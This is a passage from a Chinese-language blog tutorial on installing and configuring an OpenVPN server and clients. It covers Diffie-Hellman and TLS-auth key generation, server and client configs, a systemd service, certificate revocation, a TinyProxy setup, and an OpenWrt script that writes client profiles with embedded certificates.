href=\"#5-生成-Diffie-Hellman-文件\" class=\"headerlink\" title=\"5. 生成 Diffie-Hellman 文件\"></a>5. 生成 Diffie-Hellman 文件</h3><p>Diffie-Hellman (DH) 是一种密钥交换协议，用于在不安全的通信渠道上安全地交换密钥。<br>dh.pem 文件的主要信息是用于用于模运算的大素数 $p$ 和 生成元 $g$。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./easyrsa gen-dh</span><br></pre></td></tr></table></figure>\n\n<p>处理结果：</p>\n<ul>\n<li>DH 文件：<code>/usr/local/openvpn/easy-rsa/pki/dh.pem</code>，输出信息如下：</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using Easy-RSA &#x27;vars&#x27; configuration:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT:</span><br><span class=\"line\">  The preferred location for &#x27;vars&#x27; is within the PKI folder.</span><br><span class=\"line\">  To silence this message move your &#x27;vars&#x27; file to your PKI</span><br><span class=\"line\">  or declare your &#x27;vars&#x27; file with option: --vars=&lt;FILE&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Using SSL:</span><br><span class=\"line\">* openssl OpenSSL 3.2.2 4 Jun 2024 (Library: OpenSSL 3.2.2 4 Jun 2024)</span><br><span class=\"line\">Generating DH parameters, 2048 bit long safe prime</span><br><span class=\"line\">..............................................................................................++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*</span><br><span class=\"line\">DH parameters appear to be ok.</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\"></span><br><span class=\"line\">DH parameters of size 2048 created at:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/pki/dh.pem</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、启动-Server\"><a href=\"#四、启动-Server\" class=\"headerlink\" title=\"四、启动 Server\"></a>四、启动 Server</h2><h3 id=\"1-收集-Sever-证书文件\"><a href=\"#1-收集-Sever-证书文件\" class=\"headerlink\" title=\"1. 收集 Sever 证书文件\"></a>1. 收集 Sever 证书文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /etc/openvpn</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /etc/openvpn/server</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /var/log/openvpn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cp</span> pki/ca.crt /etc/openvpn/server/</span><br><span class=\"line\"><span class=\"built_in\">cp</span> pki/issued/caogo.crt /etc/openvpn/server/</span><br><span class=\"line\"><span class=\"built_in\">cp</span> pki/private/caogo.key /etc/openvpn/server/</span><br><span class=\"line\"><span class=\"built_in\">cp</span> pki/dh.pem /etc/openvpn/server/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-生成-TA-验证文件\"><a href=\"#2-生成-TA-验证文件\" class=\"headerlink\" title=\"2. 生成 TA 验证文件\"></a>2. 生成 TA 验证文件</h3><p>在 OpenVPN 中，ta.key（tls-auth） 是一个密钥文件，用于 HMAC 签名和验证，以提供额外的安全层，防止重放攻击和中间人攻击。这个密钥文件由 EasyRSA 工具生成，并在 OpenVPN 的配置文件中被引用。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openvpn --genkey secret /etc/openvpn/server/ta.key</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-编辑-Server-配置文件\"><a href=\"#3-编辑-Server-配置文件\" class=\"headerlink\" title=\"3. 编辑 Server 配置文件\"></a>3. 编辑 Server 配置文件</h3><p>定义 Server 位于：<code>/etc/openvpn/server.conf</code>，详细参数为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 基础配置</span><br><span class=\"line\">port 1194</span><br><span class=\"line\">proto udp</span><br><span class=\"line\">dev tun</span><br><span class=\"line\"></span><br><span class=\"line\"># 配置 DHCP 信息</span><br><span class=\"line\">server 10.8.0.0 255.255.255.0</span><br><span class=\"line\"></span><br><span class=\"line\"># 向客户端推送路由数据</span><br><span class=\"line\">push &quot;route 10.8.0.0 255.255.255.0&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">client-to-client        # 允许客户端之间通信</span><br><span class=\"line\">duplicate-cn            # 允许统一客户端证书多人共用</span><br><span class=\"line\"></span><br><span class=\"line\"># 密钥和证书文件信息</span><br><span class=\"line\">ca /etc/openvpn/server/ca.crt</span><br><span class=\"line\">cert /etc/openvpn/server/caogo.crt</span><br><span class=\"line\">key /etc/openvpn/server/caogo.key</span><br><span class=\"line\">dh /etc/openvpn/server/dh.pem</span><br><span class=\"line\"></span><br><span class=\"line\"># 要求使用 tls-auth 密钥</span><br><span class=\"line\">tls-auth /etc/openvpn/server/ta.key 0</span><br><span class=\"line\"></span><br><span class=\"line\"># 参数设定</span><br><span class=\"line\">cipher AES-256-CBC                # 设定数据传输的加密模式</span><br><span class=\"line\">persist-key                       # 持久化存储，用于重启恢复</span><br><span class=\"line\">persist-tun</span><br><span class=\"line\">keepalive 10 120</span><br><span class=\"line\">ifconfig-pool-persist ipp.txt     # 客户端重新连接时，可以继续使用上次的 IP 地址</span><br><span class=\"line\">explicit-exit-notify 1            # 服务器重启时，客户端可以自动重连，仅限 UDP 协议</span><br><span class=\"line\"></span><br><span class=\"line\"># 日志级别和路径</span><br><span class=\"line\">verb 3</span><br><span class=\"line\">; status openvpn-status.log</span><br><span class=\"line\">; log /var/log/openvpn/server.log</span><br><span class=\"line\">; log-append /var/log/openvpn/server.log</span><br></pre></td></tr></table></figure>\n\n<p>前台启动 openvpn，结果如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@vultr openvpn]# openvpn --config /etc/openvpn/server.conf</span><br><span class=\"line\">2025-01-04 10:51:42 WARNING: --topology net30 support for server configs with IPv4 pools will be removed in a future release. Please migrate to --topology subnet as soon as possible.</span><br><span class=\"line\">2025-01-04 10:51:42 DEPRECATED OPTION: --cipher set to &#x27;AES-256-CBC&#x27; but missing in --data-ciphers (AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305). OpenVPN ignores --cipher for cipher negotiations. </span><br><span class=\"line\">2025-01-04 10:51:42 NOTICE: --explicit-exit-notify ignored for --proto tcp</span><br><span class=\"line\">2025-01-04 10:51:42 OpenVPN 2.6.2 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD]</span><br><span class=\"line\">2025-01-04 10:51:42 library versions: OpenSSL 3.2.2 4 Jun 2024, LZO 2.10</span><br><span class=\"line\">2025-01-04 10:51:42 net_route_v4_best_gw query: dst 0.0.0.0</span><br><span class=\"line\">2025-01-04 10:51:42 net_route_v4_best_gw result: via 155.138.220.1 dev enp1s0</span><br><span class=\"line\">2025-01-04 10:51:42 Diffie-Hellman initialized with 2048 bit key</span><br><span class=\"line\">2025-01-04 10:51:42 CRL: loaded 1 CRLs from file /usr/local/openvpn/ssl/crl.pem</span><br><span class=\"line\">2025-01-04 10:51:42 net_route_v4_best_gw query: dst 0.0.0.0</span><br><span class=\"line\">2025-01-04 10:51:42 net_route_v4_best_gw result: via 155.138.220.1 dev enp1s0</span><br><span class=\"line\">2025-01-04 10:51:42 ROUTE_GATEWAY 155.138.220.1/255.255.254.0 IFACE=enp1s0 HWADDR=56:00:05:3b:22:a2</span><br><span class=\"line\">2025-01-04 10:51:42 TUN/TAP device tun0 opened</span><br><span class=\"line\">2025-01-04 10:51:42 net_iface_mtu_set: mtu 1500 for tun0</span><br><span class=\"line\">2025-01-04 10:51:42 net_iface_up: set tun0 up</span><br><span class=\"line\">2025-01-04 10:51:42 net_addr_ptp_v4_add: 10.8.0.1 peer 10.8.0.2 dev tun0</span><br><span class=\"line\">2025-01-04 10:51:42 net_route_v4_add: 10.8.0.0/24 via 10.8.0.2 dev [NULL] table 0 metric -1</span><br><span class=\"line\">2025-01-04 10:51:42 Could not determine IPv4/IPv6 protocol. Using AF_INET</span><br><span class=\"line\">2025-01-04 10:51:42 Socket Buffers: R=[87380-&gt;87380] S=[87380-&gt;87380]</span><br><span class=\"line\">2025-01-04 10:51:42 Listening for incoming TCP connection on [AF_INET][undef]:1194</span><br><span class=\"line\">2025-01-04 10:51:42 TCPv4_SERVER link local (bound): [AF_INET][undef]:1194</span><br><span class=\"line\">2025-01-04 10:51:42 TCPv4_SERVER link remote: [AF_UNSPEC]</span><br><span class=\"line\">2025-01-04 10:51:42 MULTI: multi_init called, r=256 v=256</span><br><span class=\"line\">2025-01-04 10:51:42 IFCONFIG POOL IPv4: base=10.8.0.4 size=62</span><br><span class=\"line\">2025-01-04 10:51:42 IFCONFIG POOL LIST</span><br><span class=\"line\">2025-01-04 10:51:42 MULTI: TCP INIT maxclients=1024 maxevents=1029</span><br><span class=\"line\">2025-01-04 10:51:42 Initialization Sequence Completed</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-设置-systemd-系统服务\"><a href=\"#4-设置-systemd-系统服务\" class=\"headerlink\" title=\"4. 设置 systemd 系统服务\"></a>4. 设置 systemd 系统服务</h3><p>编辑 systemd 配置文件： <code>/usr/lib/systemd/system/openvpn.service</code></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=OpenVPN service</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">ExecStart=/usr/local/openvpn/sbin/openvpn --config /etc/openvpn/server.conf</span><br><span class=\"line\">#Restart=on-failure</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\">RestartSec=3</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>现在就可以设置系统服务，并启动 Server。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now  openvpn</span><br><span class=\"line\">systemctl status openvpn</span><br></pre></td></tr></table></figure>\n\n<p>将看到如下输出信息：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">● openvpn.service - OpenVPN service</span><br><span class=\"line\">     Loaded: loaded (/usr/lib/systemd/system/openvpn.service; enabled; preset: disabled)</span><br><span class=\"line\">     Active: active (running) since Sat 2025-01-04 10:56:45 UTC; 3s ago</span><br><span class=\"line\">   Main PID: 67546 (openvpn)</span><br><span class=\"line\">      Tasks: 1 (limit: 4615)</span><br><span class=\"line\">     Memory: 1.1M</span><br><span class=\"line\">        CPU: 18ms</span><br><span class=\"line\">     CGroup: /system.slice/openvpn.service</span><br><span class=\"line\">             └─67546 /usr/local/openvpn/sbin/openvpn --config /usr/local/openvpn/server.conf</span><br><span class=\"line\"></span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 Could not determine IPv4/IPv6 protocol. Using AF_INET</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 Socket Buffers: R=[87380-&gt;87380] S=[87380-&gt;87380]</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 Listening for incoming TCP connection on [AF_INET][unde&gt;</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 TCPv4_SERVER link local (bound): [AF_INET][undef]:1194</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 TCPv4_SERVER link remote: [AF_UNSPEC]</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 MULTI: multi_init called, r=256 v=256</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 IFCONFIG POOL IPv4: base=10.8.0.4 size=62</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 IFCONFIG POOL LIST</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 MULTI: TCP INIT maxclients=1024 maxevents=1029</span><br><span class=\"line\">Jan 04 10:56:45 vultr.guest openvpn[67546]: 2025-01-04 10:56:45 Initialization Sequence Completed</span><br></pre></td></tr></table></figure>\n\n<p>进一步检查网络端口：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@vultr openvpn]# netstat -tunpl</span><br><span class=\"line\">Active Internet connections (only se:xrvers)</span><br><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class=\"line\">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1426/sshd: /usr/sbi </span><br><span class=\"line\">tcp        0      0 0.0.0.0:1194            0.0.0.0:*               LISTEN      17191/openvpn       </span><br><span class=\"line\">tcp6       0      0 :::22                   :::*                    LISTEN      1426/sshd: /usr/sbi </span><br><span class=\"line\">udp        0      0 127.0.0.1:323           0.0.0.0:*                           667/chronyd         </span><br><span class=\"line\">udp6       0      0 ::1:323                 :::*                                667/chronyd   </span><br></pre></td></tr></table></figure>\n\n<p>以后可以实时跟踪 openvpn 的滚动日志输出：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">journalctl -u openvpn -f</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、启动-Client\"><a href=\"#五、启动-Client\" class=\"headerlink\" title=\"五、启动 Client\"></a>五、启动 Client</h2><p>不同客户端的配置文件有差别，但CA证书和ta证书是一致的，以 x-client 为例，需要以下操作：</p>\n<h3 id=\"1-收集-Client-证书文件\"><a href=\"#1-收集-Client-证书文件\" class=\"headerlink\" title=\"1. 收集 Client 证书文件\"></a>1. 收集 Client 证书文件</h3><p>客户端需要获得以下文件：</p>\n<ul>\n<li>&#x2F;usr&#x2F;local&#x2F;openvpn&#x2F;easy-rsa&#x2F;pki&#x2F;private&#x2F;x-client.key</li>\n<li>&#x2F;usr&#x2F;local&#x2F;openvpn&#x2F;easy-rsa&#x2F;pki&#x2F;issued&#x2F;x-client.crt</li>\n<li>&#x2F;etc&#x2F;openvpn&#x2F;server&#x2F;ca.crt</li>\n<li>&#x2F;etc&#x2F;openvpn&#x2F;server&#x2F;ta.key</li>\n</ul>\n<h3 id=\"2-编辑-Client-配置文件\"><a href=\"#2-编辑-Client-配置文件\" class=\"headerlink\" title=\"2. 编辑 Client 配置文件\"></a>2. 编辑 Client 配置文件</h3><p>Client 的配置文件一般以<code>.ovpn</code>命名，例如<code>x.ovpn</code>，并与上面的证书文件放在同一目录下。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 基础配置</span><br><span class=\"line\">client</span><br><span class=\"line\">dev tun</span><br><span class=\"line\">proto udp</span><br><span class=\"line\">remote &lt;Server IP&gt; 1194</span><br><span class=\"line\"></span><br><span class=\"line\">resolv-retry infinite   # 自动重新连接</span><br><span class=\"line\">nobind                  # 无需绑定本地特定端口         </span><br><span class=\"line\">persist-key             # 持久化</span><br><span class=\"line\">persist-tun</span><br><span class=\"line\"></span><br><span class=\"line\"># 证书和密钥文件信息，在当前目录下</span><br><span class=\"line\">ca ca.crt</span><br><span class=\"line\">cert x-client.crt</span><br><span class=\"line\">key x-client.key</span><br><span class=\"line\"></span><br><span class=\"line\"># 如果服务器使用 tls-auth 密钥，客户端也必须使用</span><br><span class=\"line\">remote-cert-tls server</span><br><span class=\"line\">tls-auth ta.key 1</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定传输数据的加密方式</span><br><span class=\"line\">cipher AES-256-CBC</span><br><span class=\"line\"></span><br><span class=\"line\"># 日志级别</span><br><span class=\"line\">verb 3</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-启动client\"><a href=\"#3-启动client\" class=\"headerlink\" title=\"3. 启动client\"></a>3. 启动client</h3><p>如果客户端是 centos，需要先完成 openvpn 的安装，但不需要 easy-rsa，然后命令行就可以启动</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openvpn --config x.ovpn</span><br></pre></td></tr></table></figure>\n\n<p>OpenVPN 开发了适配各种桌面系统的 UI，下载页面位于：<a href=\"https://openvpn.net/client/\">https://openvpn.net/client/</a>。</p>\n<p><img src=\"/2025/01/04/OpenVPN-%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/pic01.png\" alt=\"alt text\"></p>\n<h2 id=\"六、简要分析\"><a href=\"#六、简要分析\" class=\"headerlink\" title=\"六、简要分析\"></a>六、简要分析</h2><h3 id=\"1-Server启动后，客户端无法连接，或者几分钟后就无法连接\"><a href=\"#1-Server启动后，客户端无法连接，或者几分钟后就无法连接\" class=\"headerlink\" title=\"1. Server启动后，客户端无法连接，或者几分钟后就无法连接\"></a>1. Server启动后，客户端无法连接，或者几分钟后就无法连接</h3><p>服务端配置应采用 udp 协议，性能更好，也是官方推荐方案！<br>在 TX 服务器上，必须手工配置系统防火墙，打开 1194 端口。<br>在 VL 服务器上，发现修改默认端口号就可以恢复连接！！！</p>\n<h3 id=\"2-如何在客户端-OVPN-配置文件附加证书和密钥文件\"><a href=\"#2-如何在客户端-OVPN-配置文件附加证书和密钥文件\" class=\"headerlink\" title=\"2. 如何在客户端 OVPN 配置文件附加证书和密钥文件\"></a>2. 如何在客户端 OVPN 配置文件附加证书和密钥文件</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 服务端的 CA 证书，CERTIFICATE 段落</span><br><span class=\"line\">&lt;ca&gt;</span><br><span class=\"line\">&lt;\\ca&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"># 某一客户端的私钥文件数据，PRIVATE KEY 段落</span><br><span class=\"line\">&lt;key&gt;</span><br><span class=\"line\">&lt;\\key&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"># 某一客户端的证书文件数据，仅需 CERTIFICATE 段落即可！</span><br><span class=\"line\">&lt;cert&gt;</span><br><span class=\"line\">&lt;\\cert&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">;tls-auth ta.key 1    # 不再需要，改成下一行直接添加</span><br><span class=\"line\">key-direction 1</span><br><span class=\"line\"></span><br><span class=\"line\"># 服务端的 ta.key 文件，OpenVPN Static key v1 段落</span><br><span class=\"line\">&lt;tls-auth&gt;</span><br><span class=\"line\">&lt;\\tls-auth&gt;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录一：easy-rsa-配置文件\"><a href=\"#附录一：easy-rsa-配置文件\" class=\"headerlink\" title=\"附录一：easy-rsa 配置文件\"></a>附录一：easy-rsa 配置文件</h2><p>easy-rsa 的配置样本位于：<code>/usr/share/doc/easy-rsa/vars.example</code>，默认的就够用！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 发布者的组织信息，无所谓</span><br><span class=\"line\">#set_var EASYRSA_REQ_COUNTRY    &quot;US&quot;</span><br><span class=\"line\">#set_var EASYRSA_REQ_PROVINCE   &quot;California&quot;</span><br><span class=\"line\">#set_var EASYRSA_REQ_CITY       &quot;San Francisco&quot;</span><br><span class=\"line\">#set_var EASYRSA_REQ_ORG        &quot;Copyleft Certificate Co&quot;</span><br><span class=\"line\">#set_var EASYRSA_REQ_EMAIL      &quot;me@example.net&quot;</span><br><span class=\"line\">#set_var EASYRSA_REQ_OU         &quot;My Organizational Unit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># CA证书的有效期，默认为10年</span><br><span class=\"line\">#set_var EASYRSA_CA_EXPIRE      3650</span><br><span class=\"line\"></span><br><span class=\"line\"># 服务器证书的有效期，默认为2年半</span><br><span class=\"line\">#set_var EASYRSA_CERT_EXPIRE    825</span><br><span class=\"line\"></span><br><span class=\"line\"># 证书注销列表（CRL）的发布间隔，默认为半年</span><br><span class=\"line\">#set_var EASYRSA_CRL_DAYS       180</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录二：关于-CRL-注销证书\"><a href=\"#附录二：关于-CRL-注销证书\" class=\"headerlink\" title=\"附录二：关于 CRL 注销证书\"></a>附录二：关于 CRL 注销证书</h2><p>OpenVPN 服务器与 VPN 客户端之间的身份验证, 主要是通过证书来进行的。有时我们需要禁止某个用户连接 VPN 服务器，则将其证书注销即可。</p>\n<h3 id=\"生成-CRL-注销证书\"><a href=\"#生成-CRL-注销证书\" class=\"headerlink\" title=\"生成 CRL 注销证书\"></a>生成 CRL 注销证书</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./vars</span><br><span class=\"line\">./easyrsa gen-crl</span><br></pre></td></tr></table></figure>\n\n<p>处理信息如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using Easy-RSA &#x27;vars&#x27; configuration:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/vars</span><br><span class=\"line\"></span><br><span class=\"line\">IMPORTANT:</span><br><span class=\"line\">  The preferred location for &#x27;vars&#x27; is within the PKI folder.</span><br><span class=\"line\">  To silence this message move your &#x27;vars&#x27; file to your PKI</span><br><span class=\"line\">  or declare your &#x27;vars&#x27; file with option: --vars=&lt;FILE&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Using SSL:</span><br><span class=\"line\">* openssl OpenSSL 3.2.2 4 Jun 2024 (Library: OpenSSL 3.2.2 4 Jun 2024)</span><br><span class=\"line\">Using configuration from /usr/local/openvpn/easy-rsa/pki/openssl-easyrsa.cnf</span><br><span class=\"line\"></span><br><span class=\"line\">Notice</span><br><span class=\"line\">------</span><br><span class=\"line\">An updated CRL has been created:</span><br><span class=\"line\">* /usr/local/openvpn/easy-rsa/pki/crl.pem</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"注销某个-x-client-证书\"><a href=\"#注销某个-x-client-证书\" class=\"headerlink\" title=\"注销某个 x-client 证书\"></a>注销某个 x-client 证书</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">. ./vars</span><br><span class=\"line\">./revoke-full x-client</span><br></pre></td></tr></table></figure>\n\n<p>执行后会在<code>keys\\</code>目录生成一个<code>crl.pem 文件</code>，这个文件中包含了注销证书的名单。<br>将该文件复制到 OpenVPN 服务器可以访问的目录（例如 ssl），然后就可以启用 CRL 验证。</p>\n<p><code>crl-verify /usr/local/openvpn/ssl/crl.pem</code></p>\n<p>最后，重启服务即可生效。</p>\n<h2 id=\"附录三：TinyProxy-代理服务\"><a href=\"#附录三：TinyProxy-代理服务\" class=\"headerlink\" title=\"附录三：TinyProxy 代理服务\"></a>附录三：TinyProxy 代理服务</h2><ul>\n<li>安装软件包</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y tinyproxy</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>编辑配置文件 <code>/etc/tinyproxy/tinyproxy.conf</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">port 8866</span><br><span class=\"line\"># Allow 127.0.0.1</span><br><span class=\"line\"># Allow ::1</span><br><span class=\"line\">DisableViaHeader Yes</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>启动系统服务</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now tinyproxy</span><br><span class=\"line\">systemctl status tinyproxy</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录四：-OPVN-配置文件生成脚本\"><a href=\"#附录四：-OPVN-配置文件生成脚本\" class=\"headerlink\" title=\"附录四： OPVN 配置文件生成脚本\"></a>附录四： OPVN 配置文件生成脚本</h2><p>OpenWrt 环境下运行本脚本，可以生成带证书信息的 OVPN 客户端配置文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Fetch WAN IP address</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /lib/functions/network.sh</span><br><span class=\"line\">network_find_wan NET_IF</span><br><span class=\"line\">network_get_ipaddr VPN_SERV <span class=\"string\">&quot;<span class=\"variable\">$&#123;NET_IF&#125;</span>&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Fetch FQDN from DDNS client</span></span><br><span class=\"line\">VPN_FQDN=<span class=\"string\">&quot;<span class=\"subst\">$(uci -q get <span class=\"string\">&quot;<span class=\"subst\">$(uci -q show ddns \\</span></span></span></span></span><br><span class=\"line\"><span class=\"subst\"><span class=\"string\"><span class=\"subst\"><span class=\"string\">| sed -n -e <span class=\"string\">&quot;/\\.enabled=&#x27;1&#x27;$/s//.lookup_host/p&quot;</span> \\</span></span></span></span></span><br><span class=\"line\"><span class=\"subst\"><span class=\"string\"><span class=\"subst\"><span class=\"string\">| sed -n -e <span class=\"string\">&quot;1p&quot;</span>)</span>&quot;</span>)</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -n <span class=\"string\">&quot;<span class=\"variable\">$&#123;VPN_FQDN&#125;</span>&quot;</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">  VPN_SERV=<span class=\"string\">&quot;<span class=\"variable\">$&#123;VPN_FQDN&#125;</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Configuration parameters</span></span><br><span class=\"line\">VPN_CONF=<span class=\"string\">&quot;/etc/openvpn/vpnserver.conf&quot;</span></span><br><span class=\"line\">VPN_PORT=<span class=\"string\">&quot;<span class=\"subst\">$(sed -n -e <span class=\"string\">&quot;/^port\\s/s///p&quot;</span> <span class=\"string\">&quot;<span class=\"variable\">$&#123;VPN_CONF&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class=\"line\">VPN_PROTO=<span class=\"string\">&quot;<span class=\"subst\">$(sed -n -e <span class=\"string\">&quot;/^proto\\s/s///p&quot;</span> <span class=\"string\">&quot;<span class=\"variable\">$&#123;VPN_CONF&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class=\"line\">VPN_DEV=<span class=\"string\">&quot;<span class=\"subst\">$(sed -n -e <span class=\"string\">&quot;/^dev\\s/s///p&quot;</span> <span class=\"string\">&quot;<span class=\"variable\">$&#123;VPN_CONF&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class=\"line\">EASYRSA_PKI=<span class=\"string\">&quot;/etc/easy-rsa/pki&quot;</span></span><br><span class=\"line\">TC_KEY=<span class=\"string\">&quot;<span class=\"subst\">$(sed -e <span class=\"string\">&quot;/^#/d;/^\\w/N;s/\\n//&quot;</span> <span class=\"string\">&quot;<span class=\"variable\">$&#123;EASYRSA_PKI&#125;</span>/tc.pem&quot;</span>)</span>&quot;</span></span><br><span class=\"line\">CA_CERT=<span class=\"string\">&quot;<span class=\"subst\">$(openssl x509 -in <span class=\"string\">&quot;<span class=\"variable\">$&#123;EASYRSA_PKI&#125;</span>/ca.crt&quot;</span>)</span>&quot;</span></span><br><span class=\"line\">NL=$<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Generate VPN client profiles</span></span><br><span class=\"line\">grep -l -r -e <span class=\"string\">&quot;TLS Web Client Authentication&quot;</span> <span class=\"string\">&quot;<span class=\"variable\">$&#123;EASYRSA_PKI&#125;</span>/issued&quot;</span> \\</span><br><span class=\"line\">| sed -e <span class=\"string\">&quot;s/^.*\\///;s/\\.\\w*$//&quot;</span> \\</span><br><span class=\"line\">| <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> VPN_ID</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">  VPN_CONF=<span class=\"string\">&quot;/etc/openvpn/<span class=\"variable\">$&#123;VPN_ID&#125;</span>.ovpn&quot;</span></span><br><span class=\"line\">  VPN_CERT=<span class=\"string\">&quot;<span class=\"subst\">$(openssl x509 -in <span class=\"string\">&quot;<span class=\"variable\">$&#123;EASYRSA_PKI&#125;</span>/issued/<span class=\"variable\">$&#123;VPN_ID&#125;</span>.crt&quot;</span>)</span>&quot;</span></span><br><span class=\"line\">  VPN_KEY=<span class=\"string\">&quot;<span class=\"subst\">$(cat <span class=\"string\">&quot;<span class=\"variable\">$&#123;EASYRSA_PKI&#125;</span>/private/<span class=\"variable\">$&#123;VPN_ID&#125;</span>.key&quot;</span>)</span>&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">cat</span> &lt;&lt; <span class=\"string\">EOF &gt; &quot;$&#123;VPN_CONF&#125;&quot;</span></span><br><span class=\"line\"><span class=\"string\">verb 3</span></span><br><span class=\"line\"><span class=\"string\">dev $&#123;VPN_DEV%%[0-9]*&#125;</span></span><br><span class=\"line\"><span class=\"string\">nobind</span></span><br><span class=\"line\"><span class=\"string\">client</span></span><br><span class=\"line\"><span class=\"string\">remote $&#123;VPN_SERV&#125; $&#123;VPN_PORT&#125; $&#123;VPN_PROTO&#125;</span></span><br><span class=\"line\"><span class=\"string\">auth-nocache</span></span><br><span class=\"line\"><span class=\"string\">remote-cert-tls server</span></span><br><span class=\"line\"><span class=\"string\">&lt;tls-crypt&gt;$&#123;NL&#125;$&#123;TC_KEY&#125;$&#123;NL&#125;&lt;/tls-crypt&gt;</span></span><br><span 